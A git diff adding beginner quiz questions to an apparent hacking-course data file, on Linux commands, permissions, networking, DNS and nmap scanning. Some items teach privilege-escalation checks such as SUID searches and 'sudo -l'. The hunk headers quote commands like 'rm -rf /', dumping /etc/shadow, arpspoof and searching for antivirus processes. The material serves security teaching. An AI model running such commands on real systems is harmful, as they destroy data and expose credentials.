@@ -734,6 +734,30 @@ This is where all your work happens.`,
                   options: ['It looks cool', 'Most hacking tools and servers run on Linux', 'It is faster than Windows', 'It has better games'],
                   correctIndex: 1,
                   explanation: 'Linux is the standard for security work because most tools are built for it and most servers run it.'
+                },
+                {
+                  id: 'p2r1-q1a',
+                  question: 'You are hired to test a company\'s web server. Which operating system is it most likely running?',
+                  options: [
+                    'Linux, because most servers run it',
+                    'Windows 95',
+                    'A phone operating system',
+                    'A game console system'
+                  ],
+                  correctIndex: 0,
+                  explanation: 'Most servers on the internet run Linux. If you want to test them, you need to be comfortable working inside Linux, usually from the terminal, because many servers have no desktop at all.'
+                },
+                {
+                  id: 'p2r1-q1b',
+                  question: 'What is Kali Linux?',
+                  options: [
+                    'A website for practicing hacking',
+                    'A Linux system that comes with many security and hacking tools already installed',
+                    'A single password-cracking program',
+                    'A type of firewall'
+                  ],
+                  correctIndex: 1,
+                  explanation: 'Kali is a version of Linux built for security work. It saves you from installing hundreds of tools by hand. Ubuntu is a popular general-purpose Linux, but Kali is the one made for testing.'
                 }
               ]
             },
@@ -782,6 +806,30 @@ echo "text" > file.txt    # Write to file
                   options: ['Creates a directory', 'Goes up one directory level', 'Lists all files', 'Deletes a directory'],
                   correctIndex: 1,
                   explanation: 'The ".." means "parent directory", so "cd .." moves up one level in the directory tree.'
+                },
+                {
+                  id: 'p2r1-q2a',
+                  question: 'You are in /home/alex and want to move into the folder called tools. Which command do you use?',
+                  options: [
+                    'ls tools',
+                    'touch tools',
+                    'cd tools',
+                    'pwd tools'
+                  ],
+                  correctIndex: 2,
+                  explanation: 'cd (change directory) moves you into a folder. ls only lists what is inside it, touch would create an empty file named tools, and pwd only shows where you are. Use pwd any time you feel lost.'
+                },
+                {
+                  id: 'p2r1-q2b',
+                  question: 'You want to read what is inside notes.txt. Which command shows its contents on the screen?',
+                  options: [
+                    'touch notes.txt',
+                    'ls notes.txt',
+                    'cd notes.txt',
+                    'cat notes.txt'
+                  ],
+                  correctIndex: 3,
+                  explanation: 'cat prints the contents of a file. touch creates a file (or updates its time), ls notes.txt only shows that the file exists, and cd only works on folders. You will use cat all the time to read config files and logs.'
                 }
               ]
             },
@@ -874,6 +922,30 @@ rm -rf /
                   options: ['"rm" deletes files, "rm -rf" force-deletes directories recursively', 'They are the same', '"rm -rf" is safer', '"rm" is for directories only'],
                   correctIndex: 0,
                   explanation: '"rm" removes files. The -r flag makes it recursive (directories), and -f forces deletion without confirmation. Use with caution!'
+                },
+                {
+                  id: 'p2r1-q3a',
+                  question: "You want to check system logs for signs of suspicious activity. Which directory should you look in?",
+                  options: [
+                    "/var/log",
+                    "/tmp",
+                    "/usr/bin",
+                    "/root"
+                  ],
+                  correctIndex: 0,
+                  explanation: "/var/log is where Linux and its services write their logs. Logs show logins, errors and other events, so they help you see what happened on a system. /tmp is for temporary files, /usr/bin holds programs, and /root is the root user's home."
+                },
+                {
+                  id: 'p2r1-q3b',
+                  question: "You want to find the file that lists user accounts. Which directory holds it?",
+                  options: [
+                    "/tmp",
+                    "/etc (the file is /etc/passwd)",
+                    "/var/log",
+                    "/home"
+                  ],
+                  correctIndex: 1,
+                  explanation: "/etc stores system configuration files, including /etc/passwd, which lists the accounts on the machine. When you land on a new Linux system, /etc is one of the first places to look."
                 }
               ]
             },
@@ -972,6 +1044,30 @@ cat access.log | grep "Failed" | cut -d' ' -f1 | sort | uniq
                   options: ['Deletes output', 'Sends output from one command as input to another', 'Saves to file', 'Combines files'],
                   correctIndex: 1,
                   explanation: 'The pipe "|" takes the output of one command and passes it as input to the next command, letting you chain operations.'
+                },
+                {
+                  id: 'p2r1-q4a',
+                  question: "Why is the command rm -rf so dangerous?",
+                  options: [
+                    "It only deletes hidden files",
+                    "It asks you to confirm every file",
+                    "It deletes files and folders for good, with no confirmation and no recycle bin",
+                    "It moves files to a trash folder you can restore"
+                  ],
+                  correctIndex: 2,
+                  explanation: "Linux has no undo for rm. The -r flag goes through folders and -f forces it without asking. One typo, such as a wrong path, can wipe out important data, so always double-check before pressing Enter."
+                },
+                {
+                  id: 'p2r1-q4b',
+                  question: "You want to rename report.txt to final.txt. Which command does it?",
+                  options: [
+                    "cp report.txt final.txt",
+                    "rm report.txt final.txt",
+                    "mkdir final.txt",
+                    "mv report.txt final.txt"
+                  ],
+                  correctIndex: 3,
+                  explanation: "mv moves a file, and moving it to a new name in the same place is how you rename it. cp makes a copy and leaves the original, rm deletes, and mkdir creates a folder instead."
                 }
               ]
             }
@@ -1033,6 +1129,30 @@ When hacking, you need to know:
                   options: ['user', 'whoami', 'name', 'getuser'],
                   correctIndex: 1,
                   explanation: '"whoami" displays the username of the current user. It is often the first command run after gaining access to a system.'
+                },
+                {
+                  id: 'p2r2-q1a',
+                  question: "You just got a shell on a Linux machine and want to know both who you are and which groups you belong to. Which command shows both?",
+                  options: [
+                    "id",
+                    "whoami",
+                    "pwd",
+                    "ls -l"
+                  ],
+                  correctIndex: 0,
+                  explanation: "id shows your user ID, your group ID and every group you are in. whoami only shows your username. Knowing your groups matters because group membership can give you access to files and tools."
+                },
+                {
+                  id: 'p2r2-q1b',
+                  question: "In /etc/passwd you see an account called www-data. What kind of account is it most likely?",
+                  options: [
+                    "A real person's account",
+                    "A service account used to run the web server",
+                    "The root user",
+                    "A group of administrators"
+                  ],
+                  correctIndex: 1,
+                  explanation: "Service accounts exist so programs like web servers run with limited rights instead of as root. They usually are not meant for people to log in with. If one is compromised, the attacker only gets that account's limited power."
                 }
               ]
             },
@@ -1086,6 +1206,30 @@ chmod 600 secret.txt    # rw------- (owner only)
                   options: ['Deletes the file', 'Gives everyone full permissions (read, write, execute)', 'Makes file read-only', 'Hides the file'],
                   correctIndex: 1,
                   explanation: '777 means rwxrwxrwx - full permissions for owner, group, and everyone else. This is usually insecure!'
+                },
+                {
+                  id: 'p2r2-q2a',
+                  question: "A file shows -rw-r--r-- in ls -l. What can other users (everyone who is not the owner or in the group) do with it?",
+                  options: [
+                    "Read and write it",
+                    "Read, write and execute it",
+                    "Read it only",
+                    "Nothing at all"
+                  ],
+                  correctIndex: 2,
+                  explanation: "The permissions are split into three groups: owner (rw-), group (r--) and other (r--). Other users only have the r, which means read. Reading these strings quickly is a core skill when looking for files that are too open."
+                },
+                {
+                  id: 'p2r2-q2b',
+                  question: "Using r=4, w=2 and x=1, which number represents rw- (read and write only)?",
+                  options: [
+                    "4",
+                    "5",
+                    "6",
+                    "7"
+                  ],
+                  correctIndex: 2,
+                  explanation: "Add the values: read (4) plus write (2) equals 6. So rwxr-xr-x is 755 and rw-r--r-- is 644. Each digit in a chmod number stands for owner, group and other, in that order."
                 }
               ]
             },
@@ -1180,6 +1324,30 @@ ls -l /usr/bin/passwd
                   options: ['They are faster', 'They run with the owner\'s privileges (often root)', 'They are hidden', 'They bypass firewalls'],
                   correctIndex: 1,
                   explanation: 'SUID files execute with the permissions of the file owner. If root owns an SUID file, you can potentially use it to run commands as root.'
+                },
+                {
+                  id: 'p2r2-q3a',
+                  question: "You got a shell as a regular user. Which command shows which commands you are allowed to run with sudo?",
+                  options: [
+                    "sudo -l",
+                    "sudo -i",
+                    "whoami",
+                    "sudo ls /root"
+                  ],
+                  correctIndex: 0,
+                  explanation: "sudo -l lists what your user is allowed to run as root. sudo -i is different: it actually opens a root shell, if you are allowed to. Checking sudo -l is usually one of the first steps when looking for a way up."
+                },
+                {
+                  id: 'p2r2-q3b',
+                  question: "Why is sudo -l useful when trying to escalate privileges?",
+                  options: [
+                    "It deletes the root password",
+                    "It reveals commands you can run as root, which may give a path to full root access",
+                    "It makes you root automatically",
+                    "It lists every user on the system"
+                  ],
+                  correctIndex: 1,
+                  explanation: "If your user can run even one risky command as root, that can often be abused to get a root shell. Many privilege escalation attacks begin by simply asking what sudo allows."
                 }
               ]
             },
@@ -1236,6 +1404,30 @@ sudo cat /etc/shadow > hashes.txt
                   options: ['/etc/passwd', '/etc/shadow', '/etc/passwords', '/root/passwords'],
                   correctIndex: 1,
                   explanation: '/etc/shadow contains password hashes and is only readable by root. /etc/passwd contains user info but not the actual passwords.'
+                },
+                {
+                  id: 'p2r2-q4a',
+                  question: "What makes a SUID file special?",
+                  options: [
+                    "It can only be read by root",
+                    "It is hidden from normal users",
+                    "It runs with the privileges of its owner, not the person who runs it",
+                    "It is automatically deleted after use"
+                  ],
+                  correctIndex: 2,
+                  explanation: "If a SUID file is owned by root, then anyone who runs it gets root's power while it runs. That is useful for things like changing your password, but a weak SUID program can let attackers escalate to root."
+                },
+                {
+                  id: 'p2r2-q4b',
+                  question: "Which command searches the whole system for SUID files?",
+                  options: [
+                    "find / -perm -0777 -type d",
+                    "ls -R / | grep suid",
+                    "grep -r SUID /etc",
+                    "find / -perm -4000 -type f"
+                  ],
+                  correctIndex: 3,
+                  explanation: "The number 4000 is the SUID permission bit, and -type f limits the search to files. This command is a standard step in privilege escalation checks, since any odd or old SUID program is worth a closer look."
                 }
               ]
             }
@@ -1295,6 +1487,30 @@ ps aux | grep -i "av\\|antivirus\\|defender"
                   options: ['ls -a', 'ps aux', 'top only', 'show processes'],
                   correctIndex: 1,
                   explanation: '"ps aux" shows all running processes with detailed information. "top" shows live updates, but "ps aux" is the standard command.'
+                },
+                {
+                  id: 'p2r3-q1a',
+                  question: "In the output of ps aux, what does the PID column show?",
+                  options: [
+                    "How much CPU the process uses",
+                    "The user who started the process",
+                    "The unique number that identifies each process",
+                    "How much memory the process uses"
+                  ],
+                  correctIndex: 2,
+                  explanation: "PID means process ID. You need it to manage a process, for example to stop it with kill. The other columns answer different questions: USER shows the owner, %CPU the processor use and %MEM the memory use."
+                },
+                {
+                  id: 'p2r3-q1b',
+                  question: "A server feels very slow. Which command gives a live, updating view so you can spot which process is using the most CPU?",
+                  options: [
+                    "cat /etc/passwd",
+                    "ls -l /tmp",
+                    "ifconfig",
+                    "top"
+                  ],
+                  correctIndex: 3,
+                  explanation: "top (or htop, which is easier to read) refreshes constantly and sorts by resource use. ps aux gives you only one snapshot. Spotting an odd process using lots of CPU can also be a sign of something running that should not be."
                 }
               ]
             },
@@ -1397,6 +1613,30 @@ nslookup target.com
                   options: ['Scans all ports', 'Tests if a host is reachable on the network', 'Downloads files', 'Shows running processes'],
                   correctIndex: 1,
                   explanation: 'Ping sends ICMP echo requests to check if a host is online and measure response time.'
+                },
+                {
+                  id: 'p2r3-q2a',
+                  question: "A program is frozen and kill 1234 does not stop it. What is the stronger option?",
+                  options: [
+                    "kill -9 1234",
+                    "kill 1234 again",
+                    "killall 1234",
+                    "ps 1234"
+                  ],
+                  correctIndex: 0,
+                  explanation: "kill -9 sends a signal the program cannot ignore, so it is stopped immediately. The program gets no chance to save its data, so use it only when the normal kill fails. killall works with names, not PIDs."
+                },
+                {
+                  id: 'p2r3-q2b',
+                  question: "You start a long scan and want to keep using the terminal while it runs. What do you add to the end of the command?",
+                  options: [
+                    "|",
+                    "&",
+                    ">",
+                    "--stop"
+                  ],
+                  correctIndex: 1,
+                  explanation: "An & at the end runs the command in the background. You can see it with jobs and bring it back with fg. The pipe (|) sends output to another command and > sends output to a file, so neither one backgrounds the job."
                 }
               ]
             },
@@ -1453,6 +1693,30 @@ netstat -an | grep ESTABLISHED  # Active connections
                   options: ['To slow it down', 'To find additional services you can exploit or access', 'To delete files', 'To install software'],
                   correctIndex: 1,
                   explanation: 'Listening ports reveal other services running on the system (databases, web servers, etc.) that may provide additional attack vectors or valuable data.'
+                },
+                {
+                  id: 'p2r3-q3a',
+                  question: "In the output of ip addr, what is the lo interface?",
+                  options: [
+                    "Your Wi-Fi card",
+                    "The router",
+                    "The loopback interface, which the machine uses to talk to itself",
+                    "The connection to the internet"
+                  ],
+                  correctIndex: 2,
+                  explanation: "lo is the loopback interface, and its address is 127.0.0.1. Traffic sent there never leaves your computer. eth0 is the usual name for the wired network card that connects you to the network."
+                },
+                {
+                  id: 'p2r3-q3b',
+                  question: "You run ping 192.168.1.10 and get replies. What does that tell you?",
+                  options: [
+                    "The host has no open ports",
+                    "The host is vulnerable",
+                    "A firewall is blocking everything",
+                    "The host is reachable and responding"
+                  ],
+                  correctIndex: 3,
+                  explanation: "Replies mean the host is up and your traffic can reach it. Be careful in the other direction: no reply does not always mean the host is down, because many hosts are set up to ignore ping."
                 }
               ]
             },
@@ -1555,6 +1819,30 @@ Firewalls block attacks. You need to know:
                   options: ['Hacks port 80', 'Tests if port 80 is open on target.com', 'Closes port 80', 'Copies files'],
                   correctIndex: 1,
                   explanation: 'The netcat (nc) command with -z (zero-I/O mode) and -v (verbose) tests if a port is open without sending data.'
+                },
+                {
+                  id: 'p2r3-q4a',
+                  question: "You run ss -tulpn and see something listening on port 22. Which service is it most likely?",
+                  options: [
+                    "SSH, for secure remote access",
+                    "A web server",
+                    "A DNS server",
+                    "An email server"
+                  ],
+                  correctIndex: 0,
+                  explanation: "Port 22 is SSH. Port 80 is HTTP. Reading the listening ports tells you what the machine offers to the network, which is exactly what an attacker or tester wants to know."
+                },
+                {
+                  id: 'p2r3-q4b',
+                  question: "What does netstat -tulpn (or ss -tulpn) show you?",
+                  options: [
+                    "Every file owned by logged-in users",
+                    "Listening TCP and UDP ports and the programs using them",
+                    "Which websites users visited",
+                    "Only your own IP address"
+                  ],
+                  correctIndex: 1,
+                  explanation: "The flags mean TCP, UDP, listening, program and numeric. The p part is the key: it links each open port to a process, so you can tell what is listening and who started it."
                 }
               ]
             }
@@ -1607,6 +1895,30 @@ PowerShell  # Windows automation
                   options: ['To show off skills', 'To automate repetitive tasks and build custom tools', 'Scripts run faster than commands', 'It looks professional'],
                   correctIndex: 1,
                   explanation: 'Scripting automates repetitive work and lets you build custom tools tailored to specific situations, making you more efficient.'
+                },
+                {
+                  id: 'p2r4-q1a',
+                  question: "You need to check 200 IP addresses to see which ones respond to ping. What is the best approach?",
+                  options: [
+                    "Ping each address by hand",
+                    "Only test the first 10",
+                    "Write a short script that loops through all of them",
+                    "Skip the ones that look unlikely"
+                  ],
+                  correctIndex: 2,
+                  explanation: "Repeating the same task many times is exactly what scripts are for. A short loop does in seconds what would take you an hour, and it will not make typing mistakes."
+                },
+                {
+                  id: 'p2r4-q1b',
+                  question: "Which language is the natural choice for automating terminal commands on Linux?",
+                  options: [
+                    "Swift",
+                    "Visual Basic",
+                    "Ruby",
+                    "Bash"
+                  ],
+                  correctIndex: 3,
+                  explanation: "Bash is the shell on most Linux systems, so anything you type in the terminal can go straight into a Bash script. Python is great for bigger tools and Ruby is what Metasploit is written in."
                 }
               ]
             },
@@ -1715,6 +2027,30 @@ nc -zv $TARGET $PORT
                   options: ['variable', '%variable%', '$variable', '@variable'],
                   correctIndex: 2,
                   explanation: 'In bash, use $ before the variable name to access its value: $TARGET, $PORT, etc.'
+                },
+                {
+                  id: 'p2r4-q2a',
+                  question: "What does the first line #!/bin/bash in a script do?",
+                  options: [
+                    "Tells the system to run the script using Bash",
+                    "Makes the file executable",
+                    "Installs Bash",
+                    "Prints the word bash on the screen"
+                  ],
+                  correctIndex: 0,
+                  explanation: "This first line is called the shebang. It names the program that should run the script. Making the file executable is a separate step done with chmod +x."
+                },
+                {
+                  id: 'p2r4-q2b',
+                  question: "You created hello.sh, but ./hello.sh says Permission denied. What fixes it?",
+                  options: [
+                    "rm hello.sh",
+                    "chmod +x hello.sh",
+                    "cat hello.sh",
+                    "mkdir hello.sh"
+                  ],
+                  correctIndex: 1,
+                  explanation: "New files are not executable by default. chmod +x adds the execute permission, so then ./hello.sh works. The ./ part tells Linux to run the script from the current folder."
                 }
               ]
             },
@@ -1859,6 +2195,30 @@ fi
                   options: ['Repeats commands', 'Makes decisions based on conditions', 'Stops the script', 'Creates variables'],
                   correctIndex: 1,
                   explanation: 'If statements allow scripts to make decisions and execute different code based on whether conditions are true or false.'
+                },
+                {
+                  id: 'p2r4-q3a',
+                  question: "You set TARGET='192.168.1.1' in a script. How do you use the variable in a command?",
+                  options: [
+                    "ping TARGET",
+                    "ping =TARGET",
+                    "ping $TARGET",
+                    "ping 'TARGET'"
+                  ],
+                  correctIndex: 2,
+                  explanation: "You store a value with no spaces around the = sign, and you read it back with a $ in front of the name. Without the $, Bash treats TARGET as plain text instead of the stored value."
+                },
+                {
+                  id: 'p2r4-q3b',
+                  question: "What does DATE=$(date) do?",
+                  options: [
+                    "Stores the word date in DATE",
+                    "Asks the user to type a date",
+                    "Deletes the variable DATE",
+                    "Runs the date command and stores its output in DATE"
+                  ],
+                  correctIndex: 3,
+                  explanation: "$(command) runs the command and gives back what it printed, so you can keep that output in a variable. To ask the user for input you would use read instead."
                 }
               ]
             },
@@ -1947,6 +2307,30 @@ curl -I http://$TARGET
                   options: ['#!/bin/bash', '#start', '//begin', '<script>'],
                   correctIndex: 0,
                   explanation: '#!/bin/bash (called a shebang) tells Linux this file should be executed with the bash interpreter.'
+                },
+                {
+                  id: 'p2r4-q4a',
+                  question: "Which loop runs a command once for each number from 1 to 100?",
+                  options: [
+                    "for i in {1..100}; do ...; done",
+                    "if i in 1..100; then ...; fi",
+                    "echo {1..100} > loop",
+                    "while 1..100; do ...; done"
+                  ],
+                  correctIndex: 0,
+                  explanation: "A for loop with {1..100} repeats the commands in the body once for every value. It works well for things like trying each port number or each host in a range."
+                },
+                {
+                  id: 'p2r4-q4b',
+                  question: "You have targets.txt with one IP address per line. How do you run the same scan on each line?",
+                  options: [
+                    "Write each IP into the script by hand",
+                    "Use a while read loop that reads the file line by line",
+                    "Use ls targets.txt",
+                    "Rename the file to targets.sh"
+                  ],
+                  correctIndex: 1,
+                  explanation: "while read takes one line at a time from the file and puts it in a variable, so one script can handle a list of any size. You are only changing the file, not the script. Only scan targets you are authorized to test."
                 }
               ]
             }
@@ -2042,6 +2426,30 @@ arpspoof -t victim gateway
                   options: ['Layer 7 (Application)', 'Layer 4 (Transport)', 'Layer 3 (Network)', 'Layer 2 (Data Link)'],
                   correctIndex: 2,
                   explanation: 'Layer 3 (Network layer) handles IP addresses and routing between networks.'
+                },
+                {
+                  id: 'p3r1-q1a',
+                  question: "Why does it matter that your data passes through many devices on its way to a server?",
+                  options: [
+                    "Every device on the path makes the data travel faster",
+                    "Each device along the path is a place where unencrypted data could be read or changed",
+                    "The data is always encrypted by the router",
+                    "Only the final server can ever see the data"
+                  ],
+                  correctIndex: 1,
+                  explanation: "Your data goes through your Wi-Fi, your router, your internet provider and more. If it is not encrypted, anyone controlling one of these points could read it or change it. This is why hackers study the path, and why encryption such as HTTPS matters."
+                },
+                {
+                  id: 'p3r1-q1b',
+                  question: "Data is split into small pieces called packets before it is sent. Why is this useful?",
+                  options: [
+                    "It makes the data impossible to read",
+                    "It lets the data skip the router",
+                    "Packets can take different routes, and only the lost pieces need to be sent again",
+                    "It reduces the file to zero size"
+                  ],
+                  correctIndex: 2,
+                  explanation: "Sending a big file in small packets is more flexible. If one packet gets lost, only that one is resent instead of the whole file. At the other end, the packets are put back together in the correct order."
                 }
               ]
             },
@@ -2098,6 +2506,30 @@ curl ifconfig.me
                   options: ['8.8.8.8', '192.168.1.100', '1.1.1.1', '151.101.1.140'],
                   correctIndex: 1,
                   explanation: '192.168.x.x addresses are private (internal network). 8.8.8.8 and 1.1.1.1 are public DNS servers.'
+                },
+                {
+                  id: 'p3r1-q2a',
+                  question: "You can ping a server's IP address and get replies, but its website will not load. Where is the problem most likely?",
+                  options: [
+                    "In the cable (Layer 1)",
+                    "In the IP address, which must be wrong",
+                    "In your network card",
+                    "In the higher layers, such as the web service or the port it uses"
+                  ],
+                  correctIndex: 3,
+                  explanation: "A ping reply shows the lower layers work: the cable, the local network and IP routing. So the problem is higher up, for example a firewall blocking port 80 or 443, or the web server not running. Thinking in layers helps you narrow a problem down fast."
+                },
+                {
+                  id: 'p3r1-q2b',
+                  question: "Which OSI layer is responsible for port numbers and for choosing between TCP and UDP?",
+                  options: [
+                    "Layer 4 (Transport)",
+                    "Layer 7 (Application)",
+                    "Layer 3 (Network)",
+                    "Layer 2 (Data Link)"
+                  ],
+                  correctIndex: 0,
+                  explanation: "Layer 4 is the Transport layer. It decides how data is delivered and uses ports to send it to the right program. Layer 3 deals with IP addresses and Layer 2 with MAC addresses."
                 }
               ]
             },
@@ -2202,6 +2634,30 @@ ip addr show | grep inet
                   options: ['24 devices', 'Subnet with 256 addresses (192.168.1.0-255)', 'Port 24', 'IPv6 address'],
                   correctIndex: 1,
                   explanation: '/24 means the first 24 bits are the network portion, leaving 8 bits for hosts (2^8 = 256 addresses).'
+                },
+                {
+                  id: 'p3r1-q3a',
+                  question: "Your laptop shows 192.168.1.20, but a website says your IP address is something completely different. Why?",
+                  options: [
+                    "One of the two numbers is fake",
+                    "Your laptop has a private IP, and the website sees your router's public IP",
+                    "The website changed your IP",
+                    "Your laptop has two network cards"
+                  ],
+                  correctIndex: 1,
+                  explanation: "Devices inside a home or office network use private addresses. Your router shares one public address for all of them when talking to the internet. This is why an outside scan reaches the router's public IP, not your laptop directly."
+                },
+                {
+                  id: 'p3r1-q3b',
+                  question: "Which of these is a public IP address?",
+                  options: [
+                    "10.1.2.3",
+                    "172.16.0.5",
+                    "8.8.4.4",
+                    "192.168.50.7"
+                  ],
+                  correctIndex: 2,
+                  explanation: "The three other addresses belong to the private ranges 10.x.x.x, 172.16.x.x and 192.168.x.x, which are used only inside networks. Public addresses like 8.8.4.4 can be reached across the internet."
                 }
               ]
             },
@@ -2327,6 +2783,30 @@ dig @ns1.target.com target.com AXFR
                   options: ['Encrypts data', 'Converts domain names to IP addresses', 'Scans for vulnerabilities', 'Blocks hackers'],
                   correctIndex: 1,
                   explanation: 'DNS (Domain Name System) translates human-readable domain names like google.com into IP addresses like 142.250.185.46.'
+                },
+                {
+                  id: 'p3r2-q1a',
+                  question: "What does TCP do that UDP does not?",
+                  options: [
+                    "It encrypts everything it sends",
+                    "It is always faster",
+                    "It does not use port numbers",
+                    "It confirms data arrived, resends lost data and keeps it in order"
+                  ],
+                  correctIndex: 3,
+                  explanation: "TCP builds a connection and checks that everything arrives correctly, which is why web pages and email use it. UDP skips these checks to be quick. Neither one encrypts data on its own."
+                },
+                {
+                  id: 'p3r2-q1b',
+                  question: "A game server listens on UDP port 27015 only. A TCP scan shows port 27015 as closed. Why?",
+                  options: [
+                    "TCP and UDP ports are separate, so you must scan UDP to see it",
+                    "The scan is broken",
+                    "Closed means the server is turned off",
+                    "The port is blocked for TCP and UDP the same way"
+                  ],
+                  correctIndex: 0,
+                  explanation: "TCP port 27015 and UDP port 27015 are two different things. A TCP scan will never find a service that only listens on UDP, so testers check both."
                 }
               ]
             },
@@ -2440,6 +2920,30 @@ nmap --script ssl-enum-ciphers -p 443 target.com
                   options: ['HTTPS is faster', 'HTTPS encrypts traffic', 'HTTP is newer', 'No difference'],
                   correctIndex: 1,
                   explanation: 'HTTPS uses SSL/TLS encryption to protect data in transit, while HTTP sends data in plaintext.'
+                },
+                {
+                  id: 'p3r2-q2a',
+                  question: "Which network is larger, 10.0.0.0/16 or 10.0.0.0/24?",
+                  options: [
+                    "/24, because 24 is bigger than 16",
+                    "/16, because it has 65,536 addresses against 256",
+                    "They are the same size",
+                    "You cannot tell without scanning"
+                  ],
+                  correctIndex: 1,
+                  explanation: "A smaller number after the slash means fewer network bits and more host addresses. So /16 is much bigger than /24. Scanning a /16 takes far longer, so check the size before you start."
+                },
+                {
+                  id: 'p3r2-q2b',
+                  question: "Which address is inside the network 192.168.1.0/24?",
+                  options: [
+                    "192.168.2.77",
+                    "192.169.1.77",
+                    "192.168.1.77",
+                    "10.0.1.77"
+                  ],
+                  correctIndex: 2,
+                  explanation: "A /24 fixes the first three numbers (192.168.1) and lets the last number change from 0 to 255. Only 192.168.1.77 matches. Reading CIDR this way tells you quickly if a host is in your scope."
                 }
               ]
             },
@@ -2553,6 +3057,30 @@ POP3: Port 110 (or 995 encrypted)
                   options: ['It is too slow', 'Credentials are sent in plaintext', 'It only works on old systems', 'It requires special software'],
                   correctIndex: 1,
                   explanation: 'FTP sends usernames and passwords unencrypted, making them easy to intercept. Use SFTP or FTPS instead.'
+                },
+                {
+                  id: 'p3r2-q3a',
+                  question: "You connect to a web server. Who sends the SYN-ACK?",
+                  options: [
+                    "Your computer",
+                    "Your router",
+                    "The DNS server",
+                    "The server, in reply to your SYN"
+                  ],
+                  correctIndex: 3,
+                  explanation: "The order is: you send SYN, the server answers SYN-ACK, then you send ACK. Only after all three steps is the connection ready for data."
+                },
+                {
+                  id: 'p3r2-q3b',
+                  question: "What is the idea behind a SYN flood attack?",
+                  options: [
+                    "Send many SYN packets and never finish the handshake, so the server fills up with half-open connections",
+                    "Send huge files to fill the disk",
+                    "Guess the server's password",
+                    "Encrypt the server's data"
+                  ],
+                  correctIndex: 0,
+                  explanation: "Each half-open connection takes up a small amount of the server's memory. With enough of them, the server cannot accept real users. This is why tools watch for unfinished handshakes."
                 }
               ]
             },
@@ -2613,6 +3141,30 @@ When you see port 3306 open, you immediately know:
                   options: ['80', '22', '443', '8080'],
                   correctIndex: 2,
                   explanation: 'Port 443 is the standard port for HTTPS (encrypted web traffic). Port 80 is for HTTP (unencrypted).'
+                },
+                {
+                  id: 'p3r2-q4a',
+                  question: "ping 8.8.8.8 works, but ping google.com fails. What is most likely broken?",
+                  options: [
+                    "Your network cable",
+                    "DNS, which turns the name into an IP address",
+                    "Your IP address",
+                    "The Google server itself"
+                  ],
+                  correctIndex: 1,
+                  explanation: "Pinging by IP works, so the network is fine. The name lookup is what fails. nslookup and dig let you test DNS directly."
+                },
+                {
+                  id: 'p3r2-q4b',
+                  question: "What does dig target.com MX tell you?",
+                  options: [
+                    "The admin passwords",
+                    "The open ports",
+                    "The mail servers for the domain",
+                    "The web server version"
+                  ],
+                  correctIndex: 2,
+                  explanation: "MX records list the servers that handle a domain's email. Testers use dig and nslookup to collect records like this about a target during reconnaissance."
                 }
               ]
             }
@@ -2672,6 +3224,30 @@ Every hacking engagement begins with reconnaissance. Nmap finds:
                   options: ['Hack websites', 'Scan networks for live hosts and open ports', 'Encrypt traffic', 'Download files'],
                   correctIndex: 1,
                   explanation: 'Nmap is a network scanner that finds live hosts, open ports, and running services.'
+                },
+                {
+                  id: 'p3r3-q1a',
+                  question: "A page returns 403 Forbidden. What does that tell you?",
+                  options: [
+                    "The page does not exist",
+                    "The server crashed",
+                    "The page moved to a new address",
+                    "The page exists, but the server refuses you access"
+                  ],
+                  correctIndex: 3,
+                  explanation: "403 is different from 404. The server knows the page is there but says you are not allowed. A tester notes this and checks that access control is set up correctly."
+                },
+                {
+                  id: 'p3r3-q1b',
+                  question: "You send unusual input to a form and the server replies with 500 Internal Server Error. What does that suggest?",
+                  options: [
+                    "The server hit an error it did not handle, which may point to a bug worth investigating",
+                    "The page is not found",
+                    "Your request worked perfectly",
+                    "You are blocked by the firewall"
+                  ],
+                  correctIndex: 0,
+                  explanation: "500 means something went wrong inside the server. Unexpected input that causes errors is often a first sign of a weakness, so testers pay attention to these responses."
                 }
               ]
             },
@@ -2794,6 +3370,30 @@ nmap -T4 -A -v target.com
                   options: ['-T0', '-T2', '-T4', '-T5'],
                   correctIndex: 3,
                   explanation: '-T5 (insane) is the fastest but generates lots of traffic, making it easy to detect. Use for speed, not stealth.'
+                },
+                {
+                  id: 'p3r3-q2a',
+                  question: "What does a valid HTTPS certificate help prove?",
+                  options: [
+                    "That the website has no bugs",
+                    "That the server really belongs to the domain you asked for, as vouched for by a trusted authority",
+                    "That the website owner is honest",
+                    "That your computer has no viruses"
+                  ],
+                  correctIndex: 1,
+                  explanation: "A certificate ties a website's identity to its encryption key, and a trusted authority signs it. It proves who you are talking to, not that the site is safe."
+                },
+                {
+                  id: 'p3r3-q2b',
+                  question: "Your browser warns about a self-signed certificate. What is the reason?",
+                  options: [
+                    "The site is always malicious",
+                    "The site does not use encryption",
+                    "No trusted authority vouched for it, so the browser cannot confirm the site's identity",
+                    "The site is offline"
+                  ],
+                  correctIndex: 2,
+                  explanation: "A self-signed certificate was created by the owner themselves. It can still encrypt, but nobody trusted has checked it. That is fine for a test lab, and a red flag on a public website."
                 }
               ]
             },
@@ -2908,6 +3508,30 @@ nmap --resume scan.gnmap
                   options: ['To make the scan faster', 'To analyze results later and generate reports', 'To hide the scan', 'To encrypt the data'],
                   correctIndex: 1,
                   explanation: 'Saving output lets you analyze results later, share with team members, and include in penetration test reports.'
+                },
+                {
+                  id: 'p3r3-q3a',
+                  question: "You need to upload files to a server securely. Which option is best?",
+                  options: [
+                    "FTP on port 21",
+                    "An HTTP form with no HTTPS",
+                    "Telnet",
+                    "SFTP or SCP, which run over SSH"
+                  ],
+                  correctIndex: 3,
+                  explanation: "SFTP and SCP use SSH, so passwords and files are encrypted on the way. FTP, Telnet and plain HTTP send data in readable form."
+                },
+                {
+                  id: 'p3r3-q3b',
+                  question: "Which change best protects an SSH server from password guessing?",
+                  options: [
+                    "Use key-based login and turn off password login",
+                    "Use shorter passwords",
+                    "Switch to FTP",
+                    "Share the password only by email"
+                  ],
+                  correctIndex: 0,
+                  explanation: "Attackers try thousands of passwords against SSH. Without password login there is nothing to guess. A long private key is far harder to break than any password."
                 }
               ]
             },
@@ -2977,6 +3601,30 @@ proxychains nmap target.com
                   options: ['It makes the full scan unnecessary', 'It identifies live hosts so you only scan reachable targets', 'It hacks the systems', 'It encrypts your traffic'],
                   correctIndex: 1,
                   explanation: 'A ping scan (-sn) quickly identifies live hosts, then you can focus detailed port scans only on targets that are actually online, saving time.'
+                },
+                {
+                  id: 'p3r3-q4a',
+                  question: "Your mail app can read emails but cannot send any. Which protocol is most likely failing?",
+                  options: [
+                    "IMAP",
+                    "SMTP, which is used for sending",
+                    "POP3",
+                    "DNS lookup only"
+                  ],
+                  correctIndex: 1,
